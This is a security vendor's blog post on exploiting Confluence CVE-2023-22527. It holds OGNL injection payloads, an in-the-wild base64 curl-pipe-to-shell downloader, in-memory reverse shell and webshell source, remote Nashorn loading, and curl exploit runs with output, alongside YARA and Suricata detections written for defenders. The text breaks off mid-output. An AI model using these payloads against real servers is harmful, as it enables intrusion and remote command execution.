---
title: "Does Confluence Dream of Shells - Blog - VulnCheck"
date: 2024-03-08T00:00:00.000Z
draft: false
type: posts
categories: 
- 
---
# Does Confluence Dream of Shells - Blog - VulnCheck

<br/>

<br/>
::check-list\\n---\\ntitle: Key Takeaways\\nico: mdi:check-bold\\nlist:\\n - VulnCheck published three proof of concept exploits that can execute arbitrary code within Confluence without touching the filesystem.\\n - There are pre-existing public exploits that use similar techniques to load the infamous Godzilla webshell, and they appear to have been used in the wild.\\n - VulnCheck shares detections and indicators of compromise to aid defenders.\\n---\\n::\\n\\n## Introduction\\n\\nSince its disclosure on \[January 16\](https://confluence.atlassian.com/security/cve-2023-22527-rce-remote-code-execution-vulnerability-in-confluence-data-center-and-confluence-server-1333990257.html), CVE-2023-22527 has been a hotbed of malicious activity. The vulnerability was quickly added to \[VulnCheck KEV\](https://api.vulncheck.com/v3/index/vulncheck-kev?cve=CVE-2023-22527) on January 21, CISA KEV on January 24, and reports of exploitation have continued through February (see \[Rapid7\](https://www.rapid7.com/blog/post/2024/02/15/rce-to-sliver-ir-tales-from-the-field/) and \[Imperva\](https://www.imperva.com/blog/attackers-quick-to-weaponize-cve-2023-22527-for-malware-delivery/). Not to be outdone, the exploit development community has been busy as well. VulnCheck currently tracks 30 unique exploits for the vulnerability. \\n\\nMany of the exploits we track are largely the same (a phenomenon we’ve touched on \[before\](https://vulncheck.com/blog/new-cve-2022-1388)). Consider the following exploit payloads for CVE-2023-22527:\\n\\n\[Nuclei\](https://raw.githubusercontent.com/projectdiscovery/nuclei-templates/main/http/cves/2023/CVE-2023-22527.yaml):\\n>\`label=aaa\\u0027%2b#request.get(\\u0027.KEY\_velocity.struts2.context\\u0027).internalGet(\\n>\\u0027ognl\\u0027).findValue(#parameters.poc\[0\],{})%2b\\u0027\\n>&poc=@org.apache.struts2.ServletActionContext@getResponse().setHeader(\\n>\\u0027x\_vuln\_check\\u0027,(new+freemarker.template.utility.Execute()).exec({"whoami"}))\`\\n\\n\[Metasploit\](https://raw.githubusercontent.com/rapid7/metasploit-framework/master/modules/exploits/multi/http/atlassian\_confluence\_rce\_cve\_2023\_22527.rb) (Windows Variant - immediately blocked by Defender):\\n>\`label=\\u0027+#request.get(\\u0027.KEY\_velocity.struts2.context\\u0027).internalGet(\\n>\\u0027ognl\\u0027).findValue(#parameters.YDwnBTJF,{})+\\u0027&YDwnBTJF=(new freemarker.template.utility.Execute()).exec({\\n>@org.apache.struts2.ServletActionContext@getRequest().getParameter('PeMYYOlk')})&\\n>PeMYYOlk=cmd.exe /c "powershell.exe -nop -w hidden -noni -c “...\`\\n\\nA payload from the wild as reported by \[Johannes Ullrich\](https://isc.sans.edu/diary/rss/30576) SANS Blog:\\n>\`label=\\\\u0027%2b#request\\\\u005b\\\\u0027.KEY\_velocity.struts2.context\\\\u0027\\\\u005d.internalGet(\\n>\\\\u0027ognl\\\\u0027).findValue(#parameters.x,{})%2b\\\\u0027&x=(new freemarker.template.utility.Execute()).exec({\\n>"echo -n Y3VybCAtcyBodHRwOi8vMTk1LjIxMS4xMjQuMTg0L2FhIHx8IHdnZXQgLXEgLU8tIGh0dHA6Ly8xOTUuMjExLjEyNC4xODQvYWE= | base64 -d | sh"})\`\\n\\nA \[GitHub\](https://github.com/Manh130902/CVE-2023-22527-POC/) example:\\n>\`label=\\u0027%2b#request\\u005b\\u0027.KEY\_velocity.struts2.context\\u0027\\u005d.internalGet(\\n>\\u0027ognl\\u0027).findValue(#parameters.x,{})%2b\\u0027&\\n>x=@org.apache.struts2.ServletActionContext@getResponse().setHeader(\\n>'X-Cmd-Response',(new freemarker.template.utility.Execute()).exec({'"+ cmd +"'}))\`\\n\\nWhat all these exploits have in common is that they use \`freemarker.template.utility.Execute\` to execute an operating system command. Which, you’ll know if you ever try to throw the Metasploit Windows payload, is a great way to get caught and subsequently blocked by endpoint detection.\\n\\nDear attacker, all is not lost. Loading into and executing code from Confluence’s memory works like a dream. Due to the magic of OGNL and Java reflection, there is no limit to what you can do.\\n\\n## Dreaming of Shells\\n\\nOriginally, we approached this “execute out of memory” problem using \[Nashorn\](https://en.wikipedia.org/wiki/Nashorn\_(JavaScript\_engine)). While that worked (and we’ll discuss it later in the blog), there is a significantly better approach.\\n\\nDuring VulnCheck’s standard GitHub exploit review for \[XDB\](https://vulncheck.com/xdb), we stumbled upon this \[repository\](https://raw.githubusercontent.com/Boogipop/CVE-2023-22527-Godzilla-MEMSHELL/main/src/main/Main.java) that exploits CVE-2023-22527 to load the \[Godzilla webshell\](https://malpedia.caad.fkie.fraunhofer.de/details/jsp.godzilla\_webshell) into memory. It contains at least three novel techniques that we weren’t aware of:\\n\\n1. It alters the max length of an OGNL expression to overcome space issues in CVE-2023-22527 exploitation. By default, Confluence appears to restrict expressions to 200 characters. Both \[Project Discovery\](https://blog.projectdiscovery.io/atlassian-confluence-ssti-remote-code-execution/) and \[Rapid7\](https://attackerkb.com/assessments/f4db997d-7a6a-4670-8c3a-0f660db486d4) shared different work-arounds for this limitation, but this new method completely removes the restriction.\\n2. The exploit uses \[org.springframework.cglib.core.ReflectUtils.defineClass()\](https://docs.spring.io/spring-framework/docs/current/javadoc-api/org/springframework/cglib/core/ReflectUtils.html) to load a class into memory from a byte string.\\n3. The loaded class is a \[ServletRequestListener\](https://tomcat.apache.org/tomcat-7.0-doc/servletapi/index.html?javax/servlet/ServletRequestListener.html) and registers to receive \[ServletRequestEvents\](https://tomcat.apache.org/tomcat-7.0-doc/servletapi/index.html?javax/servlet/ServletRequestListener.html). Meaning the uploaded class can intercept all HTTP requests to Confluence.\\n\\nThese three clever ideas combine to create a very powerful in-memory webshell. In the following sections, we’ll examine each step closer and then look at detection artifacts.\\n\\n### Loading a Class Into Memory\\n\\nTo demonstrate using CVE-2023-22527 to load a class into memory, we’ve published a proof of concept on \[GitHub\](https://github.com/vulncheck-oss/cve-2023-22527/tree/main/reverseshell). If you look at the PoC, you’ll notice there are no \`.java\` or \`.class\` files. The class the exploit loads is a reverse shell generated by the \[go-exploit\](https://github.com/vulncheck-oss/go-exploit/blob/919a2aa0d57f396e70811bf349d10e5504be7987/java/javaclass.go#L33) framework. This is done simply by invoking the following \`java.ReverseShellBytecode\`:\\n\\n\`\`\`go\\nfunc sendShell(conf \*config.Config) bool {\\n // generate the class that Confluence will execute in memory\\n reverseShell, className := java.ReverseShellBytecode(conf)\\n\`\`\`\\n\\nThe reverse shell automatically works on Windows or Linux (see \[source\](https://gist.github.com/j-baines/38eb6d16eed64986a369f7f981f57508)), which is useful because Confluence can be deployed on either operating system.\\n\\nThe problem with the generated class is that it’s much too large for the 200-character OGNL expression limit. The simplest solution is to disable this limit. Using the static function \[ognl.Ognl.applyExpressionMaxLength\](https://javadoc.io/doc/ognl/ognl/latest/index.html), the caller can lift the size restriction high enough to accommodate loading the reverse shell class. The following CVE-2023-22527 exploit lifts the expression limit to 100,000 characters.\\n\\n>\`label=\\u0027+#request.get(\\u0027.KEY\_velocity.struts2.context\\u0027).internalGet(\\n>\\u0027ognl\\u0027).findValue(#parameters.Fvp,{})+\\u0027&Fvp=@ognl.Ognl@applyExpressionMaxLength(100000)\`\\n\\nHaving done that, the attacker is free to load the class. This can be done using Spring’s static \`org.springframework.cglib.core.ReflectUtils.defineClass(String className, byte\[\] b, ClassLoader loader)\`, where \`className\` is a random string, \`b\` is the reverse shell, and \`loader\` is the \[current thread\](https://docs.oracle.com/javase/8/docs/api/java/lang/Thread.html#currentThread--)’s \[class loader\](https://docs.oracle.com/javase%2F7%2Fdocs%2Fapi%2F%2F/java/lang/Thread.html#getContextClassLoader()) via \`currentThread().getContextClassLoader()\`.\\n\\nAs a CVE-2023-22527 exploit, that looks like the following (note, in the following, the class is sent over the wire Base64 encoded and \`Base64Utils.decodeFromString\` is invoked to decode it before passing it to \`defineClass\`):\\n\\n>\`VjI=(@org.springframework.cglib.core.ReflectUtils@defineClass(\\n>'DpLlaMWFG',@org.springframework.util.Base64Utils@decodeFromString('classBytes…'),\\n>@java.lang.Thread@currentThread().getContextClassLoader())).newInstance()&\\n>label=\\u0027+#request.get(\\u0027.KEY\_velocity.struts2.context\\u0027).internalGet(\\n>\\u0027ognl\\u0027).findValue(#parameters.VjI,{})+\\u0027\`\\n\\nThe transition from the OGNL expression to executing the loaded class is the invocation of \[newInstance\](https://docs.oracle.com/javase/8/docs/api/java/lang/Class.html#newInstance--). That will cause the class’s constructor to be executed.\\n\\nOur \[GitHub\](https://github.com/vulncheck-oss/cve-2023-22527/tree/main/reverseshell) proof of concept puts that all together and establishes a reverse shell in memory. \\n\\n\\n\`\`\`sh\\nalbinolobster@mournland:~/cve-2023-22527/reverseshell$ sudo docker run -it --network=host cve-2023-22527 -a -v -e -rhost 10.9.49.97 -rport 8090 -lhost 10.9.49.82 -lport 1270 -ell SUCCESS -fll SUCCESS\\ntime=2024-03-01T18:22:37.114Z level=SUCCESS msg="Target verification succeeded!" host=10.9.49.97 port=8090 verified=true\\ntime=2024-03-01T18:22:37.412Z level=SUCCESS msg="Caught new shell from 10.9.49.97:50109"\\nC:\\Program Files\\Atlassian\\Confluence>whoami\\nnt authority\\network service\\n\\nC:\\Program Files\\Atlassian\\Confluence>\\n\`\`\`\\n\\nAbove, the reader can see we establish a \`cmd.exe\` shell and execute \`whoami\` just like all the \[other APT\](https://gist.github.com/MSAdministrator/7a61025263e279a740835da4b205e6d0#technique-commands-143). Viewed from procmon, we can see the Confluence Tomcat server spin out \`cmd.exe\` subprocesses.\\n\\n!\[Tomcat spinning out cmd.exe in procom\](/blog/confluence-dreams-of-shells/confluence-procmon-cmd.png){:width="100%"}\\n\\nJava or Tomcat spinning out shells is a well-known issue for Confluence, and our friends at SigmaHQ already have a Sigma rule that detects this behavior for CVE-2023-22518 (see: \[SigmaHQ GitHub\](https://github.com/SigmaHQ/sigma/blob/46559388e054e1aff3d7b3d8f41ebead2b690b21/rules-emerging-threats/2023/Exploits/CVE-2023-22518/proc\_creation\_win\_exploit\_cve\_2023\_22518\_confluence\_tomcat\_child\_proc.yml#L29)).\\n\\nBut that isn’t the only thing that makes class loading a tight reverse shell a bad idea for an attacker. Our implementation holds open the HTTP connection, which triggers the following stack in Confluence’s \`stderr\` log file.\\n\\n\`\`\`\\n01-Mar-2024 13:36:56.128 WARNING \[Catalina-utility-1\] org.apache.catalina.valves.StuckThreadDetectionValve.notifyStuckThreadDetected Thread \[http-nio-8090-exec-4 url: /template/aui/text-inline.vm\] (id=\[272\]) has been active for \[67,521\] milliseconds (since \[3/1/24, 1:35 PM\]) to serve the same request for \[http://10.9.49.97:8090/template/aui/text-inline.vm\] and may be stuck (configured threshold for this StuckThreadDetectionValve is \[60\] seconds). There is/are \[2\] thread(s) in total that are monitored by this Valve and may be stuck.\\n java.lang.Throwable\\n at java.base@17.0.8.1/sun.nio.ch.SocketDispatcher.read0(Native Method)\\n at java.base@17.0.8.1/sun.nio.ch.SocketDispatcher.read(Unknown Source)\\n at java.base@17.0.8.1/sun.nio.ch.NioSocketImpl.tryRead(Unknown Source)\\n at java.base@17.0.8.1/sun.nio.ch.NioSocketImpl.implRead(Unknown Source)\\n at java.base@17.0.8.1/sun.nio.ch.NioSocketImpl.read(Unknown Source)\\n at java.base@17.0.8.1/sun.nio.ch.NioSocketImpl$1.read(Unknown Source)\\n at java.base@17.0.8.1/java.net.Socket$SocketInputStream.read(Unknown Source)\\n at java.base@17.0.8.1/sun.nio.cs.StreamDecoder.readBytes(Unknown Source)\\n at java.base@17.0.8.1/sun.nio.cs.StreamDecoder.implRead(Unknown Source)\\n at java.base@17.0.8.1/sun.nio.cs.StreamDecoder.read(Unknown Source)\\n at java.base@17.0.8.1/java.io.InputStreamReader.read(Unknown Source)\\n at java.base@17.0.8.1/java.io.BufferedReader.fill(Unknown Source)\\n at java.base@17.0.8.1/java.io.BufferedReader.readLine(Unknown Source)\\n at java.base@17.0.8.1/java.io.BufferedReader.readLine(Unknown Source)\\n at QfOToRTqlN.(ABCDEFG.java:31)\\n at java.base@17.0.8.1/jdk.internal.reflect.NativeConstructorAccessorImpl.newInstance0(Native Method)\\n at java.base@17.0.8.1/jdk.internal.reflect.NativeConstructorAccessorImpl.newInstance(Unknown Source)\\n at java.base@17.0.8.1/jdk.internal.reflect.DelegatingConstructorAccessorImpl.newInstance(Unknown Source)\\n at java.base@17.0.8.1/java.lang.reflect.Constructor.newInstanceWithCaller(Unknown Source)\\n at java.base@17.0.8.1/java.lang.reflect.ReflectAccess.newInstance(Unknown Source)\\n at java.base@17.0.8.1/jdk.internal.reflect.ReflectionFactory.newInstance(Unknown Source)\\n at java.base@17.0.8.1/java.lang.Class.newInstance(Unknown Source)\\n at java.base@17.0.8.1/jdk.internal.reflect.NativeMethodAccessorImpl.invoke0(Native Method)\\n at java.base@17.0.8.1/jdk.internal.reflect.NativeMethodAccessorImpl.invoke(Unknown Source)\\n at java.base@17.0.8.1/jdk.internal.reflect.DelegatingMethodAccessorImpl.invoke(Unknown Source)\\n at java.base@17.0.8.1/java.lang.reflect.Method.invoke(Unknown Source)\\n at ognl.OgnlRuntime.invokeMethodInsideSandbox(OgnlRuntime.java:1266)\\n at ognl.OgnlRuntime.invokeMethod(OgnlRuntime.java:1251)\\n at ognl.OgnlRuntime.callAppropriateMethod(OgnlRuntime.java:1969)\\n at ognl.ObjectMethodAccessor.callMethod(ObjectMethodAccessor.java:68)\\n at com.opensymphony.xwork2.ognl.accessor.XWorkMethodAccessor.callMethodWithDebugInfo(XWorkMethodAccessor.java:98)\\n at com.opensymphony.xwork2.ognl.accessor.XWorkMethodAccessor.callMethod(XWorkMethodAccessor.java:90)\\n at ognl.OgnlRuntime.callMethod(OgnlRuntime.java:2045)\\n at ognl.ASTMethod.getValueBody(ASTMethod.java:97)\\n at ognl.SimpleNode.evaluateGetValueBody(SimpleNode.java:212)\\n at ognl.SimpleNode.getValue(SimpleNode.java:258)\\n at ognl.ASTChain.getValueBody(ASTChain.java:141)\\n at ognl.SimpleNode.evaluateGetValueBody(SimpleNode.java:212)\\n at ognl.SimpleNode.getValue(SimpleNode.java:258)\\n at ognl.Ognl.getValue(Ognl.java:537)\\n at ognl.Ognl.getValue(Ognl.java:687)\\n at ognl.Ognl.getValue(Ognl.java:662)\\n at org.apache.struts2.views.jsp.ui.OgnlTool.findValue(OgnlTool.java:48)\\n\`\`\`\\n\\nThis stacktrace gives perfect visibility into the exploitation path. The bottom of the stack reads \`OgnlTool.findValue\`, runs up through \`java.lang.Class.newInstance\`, and tops off with the socket read. A very simple YARA rule to detect this in Confluence \`stderr\` file follows:\\n\\n\`\`\`\\nrule Conflunece\_CVE\_2023\_22527\_Exploit\\n{\\n meta:\\n description = "Atlassian Confluence CVE-2023-22527 Exploit Attempt (In Memory Reverse Shell)"\\n path\_pattern = "C:\\\\Program Files\\\\Atlassian\\\\Confluence\\\\logs\\\\confluence\[0-9\]+-stderr.yyyy-mm-dd.log"\\n\\n strings:\\n $stuck = /StuckThreadDetectionValve.notifyStuckThreadDetected Thread \\\[http-nio-\\d+-exec-\\d+ url: \\/template\\/aui\\/text-inline.vm/\\n $find = "org.apache.struts2.views.jsp.ui.OgnlTool.findValue"\\n $callMethod = "com.opensymphony.xwork2.ognl.accessor.XWorkMethodAccessor.callMethod"\\n $invokeMethod = "ognl.OgnlRuntime.invokeMethod"\\n condition:\\n all of them\\n}\\n\`\`\`\\n\\nSo, while the reverse shell is a viable option, it’ll get caught by known Sigma rules and leave (as implemented) very obvious log traces. But we can load anything we want! Let’s move on to something more stealthy: an in-memory webshell.\\n\\n### Loading a Webshell\\n\\nLoading the webshell builds on the previous example. Exploitation is almost the same (using \`ReflectUtils.DefineClass\` to load a pre-defined byte string), but the Java payload is significantly different. To demonstrate this, we shared a second proof of concept that you can find \[here\](https://github.com/vulncheck-oss/cve-2023-22527/tree/main/webshell).\\n\\nThe biggest difference is the inclusion of \`ABCDEFG.java\` which is a class that implements \[ServletRequestListener\](https://docs.oracle.com/javaee%2F7%2Fapi%2F%2F/javax/servlet/ServletRequestListener.html). This is compiled into a class using \`javac\` and then embedded into the go-exploit (the ridiculous name ABCDEFG is overwritten with a random name generated by the exploit): \\n\\nBeing a \`ServletRequestListener\` allows the class to handle inbound HTTP requests via the \[requestInitialized\](https://docs.oracle.com/javaee%2F7%2Fapi%2F%2F/javax/servlet/ServletRequestListener.html#requestInitialized-javax.servlet.ServletRequestEvent-) method. But it isn’t enough to implement \`ServletRequestListener\`: the class needs to register as an event listener. This is done in the class’s constructor:\\n\\n\`\`\`java\\npublic ABCDEFG(ServletContext context) {\\n try {\\n addListener(this, getFieldValue(getFieldValue(context,"context"), "context"));\\n } catch (Throwable e) {\\n }\\n}\\n\\nprivate void addListener(Object listener, Object standardContext) throws Exception {\\n Method addApplicationEventListenerMethod = standardContext.getClass().getDeclaredMethod("addApplicationEventListener", Object.class);\\n addApplicationEventListenerMethod.setAccessible(true);\\n addApplicationEventListenerMethod.invoke(standardContext, listener);\\n}\\n\`\`\`\\n\\nThe constructor expects the caller to provide a \[javax.servlet.ServletContext\](https://docs.oracle.com/javaee/6/api/javax/servlet/ServletContext.html), from which it extracts the underlying Tomcat \[StandardContext\](https://tomcat.apache.org/tomcat-8.0-doc/api/org/apache/catalina/core/StandardContext.html) and invokes \`addApplicationEventListener\` to register for events.\\n\\nThe \`ServletContext\` is sourced from the exploit’s OGNL expression. See the full payload below (with class bytes removed):\\n\\n>\`weZ=(@org.springframework.cglib.core.ReflectUtils@defineClass('AgzJWbvprnpCqo',\\n>@org.springframework.util.Base64Utils@decodeFromString('classbytes…'),\\n>@java.lang.Thread@currentThread().getContextClassLoader())).getDeclaredConstructors\[0\].newInstance(\\n>@org.apache.struts2.ServletActionContext@getRequest().getServletContext())&\\n>label=\\u0027+#request.get(\\u0027.KEY\_velocity.struts2.context\\u0027).internalGet(\\n>\\u0027ognl\\u0027).findValue(#parameters.weZ,{})+\\u0027\`\\n\\nInstead of using \`newInstance\` like we did in the previous exploit, we’ve switched to \`getDeclaredConstructors\[0\].newInstance\` to pass the \`ServletContext\` parameter. That parameter is generated by extracting the context from \`getRequest\`. In the payload above, that looks like the following: \`@org.apache.struts2.ServletActionContext@getRequest().getServletContext()\`.\\n\\nThe result is the class can then intercept any HTTP request to Confluence. \`ABCDEFG.class\` implements a very simple webshell that looks for a specific request parameter to intercept and execute (the exploit overwrites the parameter with a random value before implanting the webshell):\\n\\n\`\`\`java\\n@Override\\npublic void requestInitialized(ServletRequestEvent sret) {\\n try {\\n ServletRequest request = sret.getServletRequest();\\n String cmd = request.getParameter("AAAAAAAAAAAA");\\n if (cmd != null) {\\n ServletResponse response = (ServletResponse)getFieldValue(getFieldValue(request, "request"), "response");\\n PrintWriter printWriter = response.getWriter();\\n Process p = Runtime.getRuntime().exec(cmd);\\n OutputStream os = p.getOutputStream();\\n InputStream in = p.getInputStream();\\n DataInputStream dis = new DataInputStream(in);\\n String disr = dis.readLine();\\n while (disr != null) {\\n printWriter.write(disr);\\n disr = dis.readLine();\\n }\\n printWriter.flush();\\n printWriter.close();\\n }\\n }\\n catch (Exception e) {\\n }\\n}\\n\`\`\`\\n\\nThis is a pretty standard webshell, hardly different from the in-memory webshell described by the \[JSP Webshell Cookbook\](https://medium.com/@m01e/jsp-webshell-cookbook-part-3-f2a96f3b81ad). But, by virtue of only being in memory, it provides a strong foothold into the victim network. Consider the following example using our \[exploit\](https://github.com/vulncheck-oss/cve-2023-22527/tree/main/webshell) to insert the webshell.\\n\\n\`\`\`sh\\nalbinolobster@mournland:~/cve-2023-22527/webshell$ ./build/cve-2023-22527\_linux-arm64 -v -a -c -e -rhost 10.9.49.80 -ell\\nSUCCESS -fll SUCCESS\\ntime=2024-03-04T10:37:44.404-05:00 level=SUCCESS msg="Target verification succeeded!" host=10.9.49.80 port=8090 verified=true\\ntime=2024-03-04T10:37:44.582-05:00 level=SUCCESS msg="The target appears to be a vulnerable version!" host=10.9.49.80 port=8090 vulnerable=yes\\ntime=2024-03-04T10:37:44.892-05:00 level=SUCCESS msg="In memory webshell available using KUifNtvadjt param"\\ntime=2024-03-04T10:37:44.892-05:00 level=SUCCESS msg="Example usage: curl -kv http://10.9.49.80:8090/?KUifNtvadjt=whoami"\\n\`\`\`\\n\\nAs the exploit says, the webshell is now available at \`http://10.9.49.80:8090/?KUifNtvadjt=whoami\`. We can execute \`whoami\` using the following \`curl\` command (note the response).\\n\\n\`\`\`sh\\nalbinolobster@mournland:~/cve-2023-22527/webshell$ curl http://10.9.49.80:8090/?KUifNtvadjt=whoami\\nnt authority\\network service\\n\`\`\`\\n\\nThe webshell, still not stealthy in executing attacker-provided commands, uses \`Runtime.getRuntime().exec(cmd)\`. That is enough to avoid \`cmd.exe\`, though (and therefore the previous Sigma rule).\\n\\n!\[Tomcat spinning out whoami.exe in procom\](/blog/confluence-dreams-of-shells/confluence-procmon-whoami.png){:width="100%"}\\n\\nRemember, though, this is just a proof of concept. A real weaponized payload (e.g. Godzilla) won’t be using \`Runtime.getRuntime().exec(cmd)\`: they’ll do everything possible to implement their entire attack flow in Java. This is pretty tough for defenders because this doesn’t leave any good Confluence logs. Perhaps the best you can do is analyze the access log for weird patterns. Our webshell leaves a pretty obvious access log signature (random param followed by command):\\n\\n> \[04/Mar/2024:10:38:32 -0500\] - http-nio-8090-exec-1 10.9.49.81 GET /?KuifNtvadjt=whoami HTTP/1.1 500 73ms 39 - curl/7.68.0\\n\\n### Staying in Memory Using Nashorn\\n\\nEarlier, the blog mentioned that we approached this problem with Nashorn initially. (Un)fortunately, Confluence \[bundles\](https://confluence.atlassian.com/doc/bundled-tomcat-and-java-versions-1005786018.html) Java 17 since 8.2.3. Nashorn was removed in Java 15, so exploitation using the JavaScript engine is becoming irrelevant for Confluence. However, there will forever be Java 8 installs, so exploitation with Nashorn in general will never be dead—so this tidbit might be of use to someone eventually.\\n\\nAlthough this blog touches on using \`applyExpressionMaxLength\` to bypass the OGNL limit, we weren’t aware of this technique originally. The go-exploit \[Nashorn payload\](https://github.com/vulncheck-oss/cve-2023-22527/tree/main/nashorn) is quite large, so we needed a workaround. Fortunately, Nashorn supports the \[load\](https://wiki.openjdk.org/display/Nashorn/Nashorn+extensions) keyword. \`load\` can be used to fetch a remote file that can then be executed via \`eval\`. The CVE-2023-25527 exploit looks like this:\\n\\n>\`label==\\u0027%2b#request\\u005b\\u0027.K%45Y\_velocity.struts2.context\\u0027\\n>\\u005d.internalGet(\\u0027ognl\\u0027).findValue(#parameters.x,%7B%7D)%2b\\u0027&x=(\\n>new javax.script.ScriptEngineManager().getEngineByName('js').eval('load("http://10.9.49.81:8080/UOymEWIpfhgs")'))\`\\n\\nYou can find the proof of concept on \[GitHub\](https://github.com/vulncheck-oss/cve-2023-22527/tree/main/nashorn). The exploit spins up its own HTTP server to serve the Nashorn payload. Example usage:\\n\\n\`\`\`sh\\nalbinolobster@mournland:~/cve-2023-22527/nashorn$ sudo docker run -it --network=host nashorn -v -a -c -e -rhost 10.9.49.8\\n8 -lhost 10.9.49.81 -lport 1270 -httpAddr 10.9.49.81 -ell SUCCESS -fll SUCCESS\\ntime=2024-03-04T16:10:38.002Z level=SUCCESS msg="Target verification succeeded!" host=10.9.49.88 port=8090 verified=true\\ntime=2024-03-04T16:10:38.146Z level=SUCCESS msg="The target appears to be a vulnerable version!" host=10.9.49.88 port=8090 vulnerable=yes\\ntime=2024-03-04T16:10:40.503Z level=SUCCESS msg="Caught new shell from 10.9.49.88:41826"\\nid\\nuid=2002(confluence) gid=2002(confluence) groups=2002(confluence),0(root)\\n\`\`\`\\n\\n## Detection on the Wire\\n\\nPerhaps the best place to catch exploitation of CVE-2023-22527 is on the wire. VulnCheck’s Initial Access team likes to obfuscate payloads to make life more challenging for detection engineers. For example, the reverse shell payload is entirely URL encoded here:\\n\\n!\[Lightly obfuscated exploit bypasses detections\](/blog/confluence-dreams-of-shells/cve-2023-22527-wireshark.png){:width="100%"}\\n\\nThis isn’t that strong of an obfuscation, though. The two elements of exploitation are still there. There is an unobfuscated \`label\` parameter (not pictured but also not encoded because it’s a parameter) and \`u0027\` in some representations (URL encoded here). As such, the following rules should catch all CVE-2023-22527 exploitation attempts:\\n\\n\`\`\`\\nalert http any any -> any any ( \\\\n msg:"VULNCHECK Confluence CVE-2023-22527 Exploit Attempt (POST Body)"; \\\\n flow:established,to\_server; \\\\n http.method; content:"POST"; \\\\n http.uri; content:"/template/aui/text-inline.vm"; startswith; \\\\n http.request\_body; content:"label="; \\\\n pcre:"/label=\[^&\]\*(\\\\|%5c)(u|%75)|(0|%30)(0|%30)(2|%32)(7|%37)/i"; \\\\n reference:cve,CVE-2023-22527; \\\\n classtype:web-application-attack; \\\\n sid:12700246; rev:2;)\\n\\nalert http any any -> any any ( \\\\n msg:"VULNCHECK Confluence CVE-2023-22527 Exploit Attempt (POST URI)"; \\\\n flow:established,to\_server; \\\\n http.method; content:"POST"; \\\\n http.uri; content:"/template/aui/text-inline.vm"; startswith; \\\\n content:"label="; distance: 0; \\\\n pcre:"/label=\[^&\]\*(\\\\|%5c)(u|%75)|(0|%30)(0|%30)(2|%32)(7|%37)/i"; \\\\n reference:cve,CVE-2023-22527; \\\\n classtype:web-application-attack; \\\\n sid:12700258; rev:1;)\\n\\nalert http any any -> any any ( \\\\n msg:"VULNCHECK Confluence CVE-2023-22527 Exploit Attempt (GET)"; \\\\n flow:established,to\_server; \\\\n http.method; content:"GET"; \\\\n http.uri; content:"/template/aui/text-inline.vm"; startswith; \\\\n content:"label="; distance: 0; \\\\n pcre:"/label=\[^&\]\*(\\\\|%5c)(u|%75)|(0|%30)(0|%30)(2|%32)(7|%37)/i"; \\\\n reference:cve,CVE-2023-22527; \\\\n classtype:web-application-attack; \\\\n sid:12700259; rev:1;)\\n\`\`\`\\n\\nPerhaps surprising is that we have three rules for this vulnerability. It turns out, though, that the exploit can be thrown using HTTP GET:\\n\\n\`\`\`sh\\nalbinolobster@mournland:~$ curl -kvs -G -o /dev/null http://10.9.49.76:8090/template/aui/text-inline.vm \\\\n> --data-urlencode 'label=\\u0027+#request.get(\\u0027.KEY\_velocity.struts2.context\\u0027).internalGet(\\u0027ognl\\u0027).findValue(#parameters.p1,{})+\\u0027' \\\\n> --data-urlencode 'p1=@org.apache.struts2.ServletActionContext@getResponse().setHeader("Cmd-Ret",(new freemarker.template.utility.Execute()).exec({"whoami"}))'\\n\* Trying 10.9.49.76:8090...\\n\* TCP\_NODELAY set\\n\* Connected to 10.9.49.76 (10.9.49.76) port 8090 (#0)\\n> GET /template/aui/text-inline.vm?label=%5Cu0027%2B%23request.get%28%5Cu0027.KEY\_velocity.struts2.context%5Cu0027%29.internalGet%28%5Cu0027ognl%5Cu0027%29.findValue%28%23parameters.p1%2C%7B%7D%29%2B%5Cu0027&p1=%40org.apache.struts2.ServletActionContext%40getResponse%28%29.setHeader%28%22Cmd-Ret%22%2C%28new%20freemarker.template.utility.Execute%28%29%29.exec%28%7B%22whoami%22%7D%29%29 HTTP/1.1\\n> Host: 10.9.49.76:8090\\n> User-Agent: curl/7.68.0\\n> Accept: \*/\*\\n>\\n\* Mark bundle as not supporting multiuse\\n< HTTP/1.1 200\\n< Cache-Control: no-store\\n< Expires: Thu, 01 Jan 1970 00:00:00 GMT\\n< X-XSS-Protection: 1; mode=block\\n< X-Content-Type-Options: nosniff\\n< X-Frame-Options: SAMEORIGIN\\n< Content-Security-Policy: frame-ancestors 'self'\\n< X-Confluence-Request-Time: 1709669510258\\n< Set-Cookie: JSESSIONID=4CABC119C5C70CC2C745D4107663F45C; Path=/; HttpOnly\\n< Cmd-Ret: nt authority\\network service \\n< X-Accel-Buffering: no\\n< Content-Type: text/html;charset=UTF-8\\n< Content-Language: en-US\\n< Transfer-Encoding: chunked\\n< Date: Tue, 05 Mar 2024 20:11:50 GMT\\n<\\n{ \[7656 bytes data\]\\n\* Connection #0 to host 10.9.49.76 left intact\\n\`\`\`\\n\\nAnd it can be thrown with the parameters in the POST URI:\\n\\n\`\`\`sh\\nalbinolobster@mournland:~$ curl -kvs -X POST -G -o /dev/null http://10.9.49.76:8090/template/aui/text-inline.vm \\\\n> --data-urlencode 'label=\\u0027+#request.get(\\u0027.KEY\_velocity.struts2.context\\u0027).internalGet(\\u0027ognl\\u0027).findValue(#parameters.p1,{})+\\u0027' \\\\n> --data-urlencode 'p1=@org.apache.struts2.ServletActionContext@getResponse().setHeader("Cmd-Ret",(new freemarker.template.utility.Execute()).exec({"whoami"}))'\\n\* Trying 10.9.49.76:8090...\\n\* TCP\_NODELAY set\\n\* Connected to 10.9.49.76 (10.9.49.76) port 8090 (#0)\\n> POST /template/aui/text-inline.vm?label=%5Cu0027%2B%23request.get%28%5Cu0027.KEY\_velocity.struts2.context%5Cu0027%29.internalGet%28%5Cu0027ognl%5Cu0027%29.findValue%28%23parameters.p1%2C%7B%7D%29%2B%5Cu0027&p1=%40org.apache.struts2.ServletActionContext%40getResponse%28%29.setHeader%28%22Cmd-Ret%22%2C%28new%20freemarker.template.utility.Execute%28%29%29.exec%28%7B%22whoami%22%7D%29%29 HTTP/1.1\\n> Host: 10.9.49.76:8090\\n> User-Agent: curl/7.68.0\\n> Accept: \*/\*\\n>\\n\* Mark bundle as not supporting multiuse\\n< HTTP/1.1 200\\n< Cache-Control: no-store\\n< Expires: Thu, 01 Jan 1970 00:00:00 GMT\\n< X-XSS-Protection: 1; mode=block\\n< X-Content-Type-Options: nosniff\\n< X-Frame-Options: SAMEORIGIN\\n< Content-Security-Policy: frame-ancestors 'self'\\n< X-Confluence-Request-Time: 1709669588783\\n< Set-Cookie: JSESSIONID=B96DB876DCA328DEDC0073326B666805; Path=/; HttpOnly\\n< Cmd-Ret: nt 